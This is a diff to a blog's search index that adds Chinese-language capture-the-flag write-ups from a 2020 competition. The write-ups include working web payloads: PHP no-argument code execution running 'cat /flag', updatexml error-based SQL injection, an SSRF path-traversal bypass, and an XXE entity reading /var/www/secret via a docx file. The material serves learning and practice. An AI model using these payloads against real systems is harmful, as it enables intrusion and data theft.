@@ -1,6 +1,170 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>2020 易林博“停课不停赛，以赛促学” CRC32</title>
+    <url>/2020/03/29/CRC32/</url>
+    <content><![CDATA[<p>正常的通过CRC校验码爆破密码，打开压缩包发现每个密码文件都是四字节，改一改脚本依次爆破</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">dic=string.printable</span><br><span class="line">crc = <span class="number">0x5194c2d0</span>  <span class="comment"># 记得要以0x开头</span></span><br><span class="line"><span class="keyword">print</span> <span class="number">3</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> dic :</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> dic:</span><br><span class="line">            <span class="keyword">for</span> q <span class="keyword">in</span> dic:</span><br><span class="line">                s=str(i)+str(j)+str(p)+str(q)</span><br><span class="line">                <span class="keyword">if</span> crc == (binascii.crc32(s) &amp; <span class="number">0xffffffff</span>):</span><br><span class="line">                    print(s)</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+]]></content>
+      <categories>
+        <category>Crypto</category>
+      </categories>
+      <tags>
+        <tag>Crypto_CRC32</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2020 易林博“停课不停赛，以赛促学” RCE_NOPAR</title>
+    <url>/2020/03/29/RCE_NOPAR/</url>
+    <content><![CDATA[<p>无字符GETSHELL就行</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'var'</span>]))&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[^\W]+\((?R)?\)/'</span>, <span class="string">''</span>, $_GET[<span class="string">'var'</span>])) &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">if</span> (!preg_match(<span class="string">'/et|dir|na|info|dec|oct|pi|log/i'</span>, $_GET[<span class="string">'var'</span>])) &#123;</span></span><br><span class="line"><span class="php">                    <span class="keyword">eval</span>($_GET[<span class="string">'var'</span>]);</span></span><br><span class="line"><span class="php">                &#125;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        <span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">die</span>(<span class="string">"Sorry!"</span>);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">    show_source(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>payload：eval(hex2bin(session_id(session_start())))</p>
+<p>改PHPSSEION值为16进制就行</p>
+<p>system(‘cat /flag’);     -&gt;      73797374656d2827636174202f666c616727293b</p>
+]]></content>
+      <categories>
+        <category>Web</category>
+        <category>php</category>
+      </categories>
+      <tags>
+        <tag>Web_无字符Getshell</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2020 易林博“停课不停赛，以赛促学” EasyRsa</title>
+    <url>/2020/03/29/EasyRsa/</url>
+    <content><![CDATA[<p>热身题，直接给了私钥，但是有一些迷惑性的信息</p>
+<p><img src="/2020/03/29/EasyRsa/image-20200330100636601.png" alt="image-20200330100636601"></p>
+<p>2两个1024bit，5个512bit，用俩大数模小数，得到的值是0的即为p,q</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pmq <span class="keyword">import</span> *</span><br><span class="line">x1=int(<span class="string">'''00 E5 27 56 BF EB</span></span><br><span class="line"><span class="string">DA 06 F1 E7 C5 7C 4C 27  87 60 8F E7 1E C1 1F DE</span></span><br><span class="line"><span class="string">1B BF 7A 4A 0C A7 82 46  36 5D 03 AE 68 EB 87 97</span></span><br><span class="line"><span class="string">8A 33 61 DD 0F D9 F3 07  BF 35 52 CB 4D A7 83 B8</span></span><br><span class="line"><span class="string">3F 06 BF CE ED 62 7E 35  4C C7 41 AD A1 C8 F6 4C</span></span><br><span class="line"><span class="string">44 3F DD 01 44 F8 F2 C2  F4 C3 85 1F 1F 96 B8 89</span></span><br><span class="line"><span class="string">7D 04 B7 2A 1C 39 FC 34  2E B2 87 E9 D4 84 1D 30</span></span><br><span class="line"><span class="string">99 F6 45 96 DF 4A DF B1  84 B5 11 87 8B 3F 0C 4C</span></span><br><span class="line"><span class="string">94 2C A9 92 0F FB 7F 99  47 1E 05'''</span>.replace(<span class="string">' '</span>,<span class="string">''</span>).replace(<span class="string">'\n'</span>,<span class="string">''</span>),<span class="number">16</span>)</span><br><span class="line">x3=int(<span class="string">'''00 F7 27  15 97 1B 35 84 F9 40 0D</span></span><br><span class="line"><span class="string">95 61 B9 62 D2 39 09 D9  8F 74 F5 38 4C AF C1 96</span></span><br><span class="line"><span class="string">79 38 20 8D B6 6A C8 04  9F 27 93 09 D3 7A 31 56</span></span><br><span class="line"><span class="string">74 27 A8 46 4D B4 CD D1  60 14 B6 08 0D 5F 72 F7</span></span><br><span class="line"><span class="string">75 60 F7 F7 97 47'''</span>.replace(<span class="string">' '</span>,<span class="string">''</span>).replace(<span class="string">'\n'</span>,<span class="string">''</span>),<span class="number">16</span>)</span><br><span class="line">x4=int(<span class="string">'''00 ED 5B 4F 9E C8 14 02</span></span><br><span class="line"><span class="string">51 58 42 0D 73 34 07 89  B2 1E 85 C0 09 AA BD 04</span></span><br><span class="line"><span class="string">EE 4F 37 E1 EC 6C B7 8B  37 AF D7 30 42 4C 53 BA</span></span><br><span class="line"><span class="string">8C 16 75 14 EC 0E C9 7D  FD 77 C6 CD 09 6E 56 49</span></span><br><span class="line"><span class="string">55 4E 7B 68 5F E6 63 5E  53'''</span>.replace(<span class="string">' '</span>,<span class="string">''</span>).replace(<span class="string">'\n'</span>,<span class="string">''</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p=x3</span><br><span class="line">q=x4</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">c=int(open(<span class="string">r'C:\Users\Administrator\Desktop\EasyRSA\flag.en'</span>,<span class="string">'rb'</span>).read().encode(<span class="string">'hex'</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> hex(M(e,p,q,c))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'666c61677b57653163306d6543746633725f656c61627d0a'</span>.decode(<span class="string">'hex'</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x02-CRC32"><a href="#0x02-CRC32" class="headerlink" title="0x02 CRC32"></a>0x02 CRC32</h2><p>正常的通过CRC校验码爆破密码，打开压缩包发现每个密码文件都是四字节，改一改脚本依次爆破</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">dic=string.printable</span><br><span class="line">crc = <span class="number">0x5194c2d0</span>  <span class="comment"># 记得要以0x开头</span></span><br><span class="line"><span class="keyword">print</span> <span class="number">3</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> dic :</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> dic:</span><br><span class="line">            <span class="keyword">for</span> q <span class="keyword">in</span> dic:</span><br><span class="line">                s=str(i)+str(j)+str(p)+str(q)</span><br><span class="line">                <span class="keyword">if</span> crc == (binascii.crc32(s) &amp; <span class="number">0xffffffff</span>):</span><br><span class="line">                    print(s)</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+]]></content>
+      <categories>
+        <category>Crypto</category>
+      </categories>
+      <tags>
+        <tag>Crypto_RSA算法原理</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2020 易林博“停课不停赛，以赛促学” SQLI</title>
+    <url>/2020/03/29/SQLI/</url>
+    <content><![CDATA[<p>这个页面太丑了，三个功能，注册、登入、改密码，一般这种涉及多次数据库操作的基本都是二次注入。测试用户名处</p>
+<blockquote>
+<p>注册用户：ccc”</p>
+<p>密码：ccc</p>
+</blockquote>
+<p>改密码的时候报错了</p>
+<p><img src="/2020/03/29/SQLI/image-20200327151345433.png" alt="image-20200327151345433"></p>
+<p>多测试测试，过来了空格、/*、and……直接报错注入最方便了</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">ccc"||updatexml(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(table_name))<span class="keyword">from</span>(information_schema.tables)<span class="keyword">where</span>(table_schema=<span class="keyword">database</span>())),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">#</span></span><br><span class="line"></span><br><span class="line">ccc<span class="string">"||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name=flag)&amp;(table_schema=database())),0x7e),1)#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ccc"</span>||updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span>(flag)<span class="keyword">from</span>(flag)),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>Web</category>
+        <category>php</category>
+      </categories>
+      <tags>
+        <tag>Web_二次注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2020 易林博“停课不停赛，以赛促学” re1</title>
+    <url>/2020/03/29/Re1/</url>
+    <content><![CDATA[<p>签到题，先运行下程序，发现有文字提示“输入flag”。<br>用IDA打开程序，搜索字符flag，找到程序关键函数sub_140001070()。<br>找到判断逻辑，读取输入直接与flag对比。直接将代码if判断条件中的字符串提取出即可。</p>
+]]></content>
+      <categories>
+        <category>Re</category>
+      </categories>
+      <tags>
+        <tag>Re_算法求解</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2020 易林博“停课不停赛，以赛促学” SSRF</title>
+    <url>/2020/03/29/SSRF/</url>
+    <content><![CDATA[<p>把file后面的参数两层base64解开，就知道可以包含其他文件，两层base64编码就行</p>
+<p>第一层读index.php</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">error_reporting(E_ALL || ~E_NOTICE);</span></span><br><span class="line"></span><br><span class="line"><span class="php">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(! <span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))</span></span><br><span class="line"><span class="php">    header(<span class="string">'Refresh:0;url=./index.php?file=WTNSbWFXMWhaMlV1YW5Cbg=='</span>);</span></span><br><span class="line"><span class="php">$file = base64_decode(base64_decode($_GET[<span class="string">'file'</span>]));</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">'&lt;title&gt;'</span>.$_GET[<span class="string">'file'</span>].<span class="string">'&lt;/title&gt;'</span>;</span></span><br><span class="line"><span class="php">$file = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>,<span class="string">""</span>, $file);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">'input_filename:   '</span>. $file.<span class="string">'&lt;/br&gt;'</span>;</span></span><br><span class="line"><span class="php">$file = str_replace(<span class="string">"ctf"</span>,<span class="string">"flag"</span>, $file);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">'real_filename:   '</span>.$file.<span class="string">'&lt;/br&gt;'</span>;</span></span><br><span class="line"><span class="php">$txt = base64_encode(file_get_contents($file));</span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;img src='data:image/gif;base64,"</span>.$txt.<span class="string">"'&gt;&lt;/img&gt;"</span>;</span></span><br><span class="line">/*</span><br><span class="line"> * Can you find the flag file?</span><br><span class="line"> *</span><br><span class="line"> * Hint: hal0flagi5here.php</span><br><span class="line"><span class="php"> */</span></span><br></pre></td></tr></table></figure>
+
+<p>继续读hal0flagi5here.php</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$argv[<span class="number">1</span>]=$_GET[<span class="string">'url'</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(filter_var($argv[<span class="number">1</span>],FILTER_VALIDATE_URL))</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">	$r = parse_url($argv[<span class="number">1</span>]);</span></span><br><span class="line"><span class="php">	print_r($r);</span></span><br><span class="line"><span class="php">	<span class="keyword">if</span>(preg_match(<span class="string">'/happyctf\.com$/'</span>,$r[<span class="string">'host'</span>]))</span></span><br><span class="line"><span class="php">	&#123;</span></span><br><span class="line"><span class="php">		$url=file_get_contents($argv[<span class="number">1</span>]);</span></span><br><span class="line"><span class="php">		<span class="keyword">echo</span>($url);</span></span><br><span class="line"><span class="php">	&#125;<span class="keyword">else</span></span></span><br><span class="line"><span class="php">	&#123;</span></span><br><span class="line"><span class="php">		<span class="keyword">echo</span>(<span class="string">"error"</span>);</span></span><br><span class="line"><span class="php">	&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">&#125;<span class="keyword">else</span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">	<span class="keyword">echo</span> <span class="string">"403 Forbidden"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>这里卡了我很久，用data://happyctf.com/plain,base64,xxxxx只能构造返回体，不能任意读文件。</p>
+<p>通过测试，file_get_contents()种如果是不规范的协议，则进行本地文件包含，构造</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="regexp">//</span>happyctf.com<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/flag.txt</span></span><br></pre></td></tr></table></figure>
+
+
+
+]]></content>
+      <categories>
+        <category>Web</category>
+        <category>php</category>
+      </categories>
+      <tags>
+        <tag>Web_SSRF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2020 易林博“停课不停赛，以赛促学” angr2_2</title>
+    <url>/2020/03/29/angr2_2%20wp/</url>
+    <content><![CDATA[<p>没有任何保护，IDA打开定位main函数，一键F5。<br>对main进行分析，找到程序逻辑：输入一字符加密判断是否等于”ZCPTMWEHULCABSBD“。<br>找到加密的算法，对算法进行逆向。得到关键信息，输入的字符串都为小写字母。<br>用脚本对加密后的字符串”ZCPTMWEHULCABSBD“进行逆运算，结合限制条件小写字母得到flag。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">//python脚本</span><br><span class="line">s=[<span class="string">'Z'</span>,<span class="string">'C'</span>,<span class="string">'P'</span>,<span class="string">'T'</span>,<span class="string">'M'</span>,<span class="string">'W'</span>,<span class="string">'E'</span>,<span class="string">'H'</span>,<span class="string">'V'</span>,<span class="string">'L'</span>,<span class="string">'C'</span>,<span class="string">'A'</span>,<span class="string">'B'</span>,<span class="string">'S'</span>,<span class="string">'B'</span>,<span class="string">'D'</span>]</span><br><span class="line">v3=<span class="number">0</span></span><br><span class="line">v5=len(s)</span><br><span class="line">l=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,v5):</span><br><span class="line">	a=<span class="number">18</span>-i	</span><br><span class="line">	c=ord(s[i])<span class="number">-29</span>*a</span><br><span class="line">        <span class="keyword">while</span>((c&lt;=<span class="number">64</span>)|(c&gt;<span class="number">90</span>)):		</span><br><span class="line">		c+=<span class="number">26</span></span><br><span class="line">	k+=chr(c)</span><br><span class="line">print(k)</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>Re</category>
+      </categories>
+      <tags>
+        <tag>Re_算法求解</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2020 易林博“停课不停赛，以赛促学” XXE</title>
+    <url>/2020/03/29/XXE/</url>
+    <content><![CDATA[<p>下载模板docx文件，后缀改为zip，直接在zip下修改docProps/core.xml文件内容为</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span>[</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"/var/www/secret"</span>&gt;</span></span></span><br><span class="line"><span class="meta">  ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">cp:coreProperties</span> <span class="attr">xmlns:cp</span>=<span class="string">"http://schemas.openxmlformats.org/package/2006/metadata/core-properties"</span> <span class="attr">xmlns:dc</span>=<span class="string">"http://purl.org/dc/elements/1.1/"</span> <span class="attr">xmlns:dcterms</span>=<span class="string">"http://purl.org/dc/terms/"</span> <span class="attr">xmlns:dcmitype</span>=<span class="string">"http://purl.org/dc/dcmitype/"</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dc:title</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">dc:title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dc:subject</span>&gt;</span><span class="tag">&lt;/<span class="name">dc:subject</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dc:creator</span>&gt;</span><span class="tag">&lt;/<span class="name">dc:creator</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cp:keywords</span>&gt;</span><span class="tag">&lt;/<span class="name">cp:keywords</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dc:description</span>&gt;</span><span class="tag">&lt;/<span class="name">dc:description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cp:lastModifiedBy</span>&gt;</span><span class="tag">&lt;/<span class="name">cp:lastModifiedBy</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cp:revision</span>&gt;</span>1<span class="tag">&lt;/<span class="name">cp:revision</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dcterms:created</span> <span class="attr">xsi:type</span>=<span class="string">"dcterms:W3CDTF"</span>&gt;</span>2015-08-01T19:00:00Z<span class="tag">&lt;/<span class="name">dcterms:created</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dcterms:modified</span> <span class="attr">xsi:type</span>=<span class="string">"dcterms:W3CDTF"</span>&gt;</span>2015-08-01T19:01:00Z<span class="tag">&lt;/<span class="name">dcterms:modified</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">cp:coreProperties</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>改回docx格式上传即可触发XXE漏洞</p>
+<p><img src="/2020/03/29/XXE/image-20200327152415694.png" alt="image-20200327152415694"></p>
+]]></content>
+      <categories>
+        <category>Web</category>
+        <category>php</category>
+      </categories>
+      <tags>
+        <tag>Web_XXE</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2020 易林博“停课不停赛，以赛促学” vm</title>
+    <url>/2020/03/29/vm/</url>
+    <content><![CDATA[<p>这是一个C语言虚拟机题，而且也没开地址随机化，于是直接想到angr自动化解题<br><strong>第一层考点：angr框架使用</strong></p>
+<figure class="highlight pf"><table><tr><td class="code"><pre><span class="line">import angr</span><br><span class="line">import claripy</span><br><span class="line">proj = angr.Project(<span class="string">"./vm"</span>)</span><br><span class="line"><span class="keyword">state</span> = proj.factory.entry_state()</span><br><span class="line">simgr = proj.factory.simgr(<span class="keyword">state</span>)</span><br><span class="line">simgr.explore(find=<span class="number">0</span>x4009BC,avoid=<span class="number">0</span>x4008C7)</span><br><span class="line">print (simgr.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br></pre></td></tr></table></figure>
+
+<p>​                                </p>
+]]></content>
+      <categories>
+        <category>Re</category>
+      </categories>
+      <tags>
+        <tag>Re_angr的使用</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>2020 GXZYCTF easy_heap</title>
     <url>/2020/03/21/2020_GXZYCTF_easy_heap/</url>
     <content><![CDATA[<p>add功能里如果size不符合要求，不会退出程序，这时，堆不会进行初始化，但是，指针却可以使用，进而造成问题。</p>
@@ -246,6 +410,7 @@
 
 <p>反弹shell成功，<code>cat app.js</code></p>
 <p><img src="/2020/03/09/2020_GXZYCTF_GuessGame/image-20200309222006644.png" alt></p>
+<p><a href="https://github.com/BOITeam/GXZYCTF/blob/master/WEB/GuessGame.zip" target="_blank" rel="noopener">题目源码</a></p>
 ]]></content>
       <categories>
         <category>Web</category>
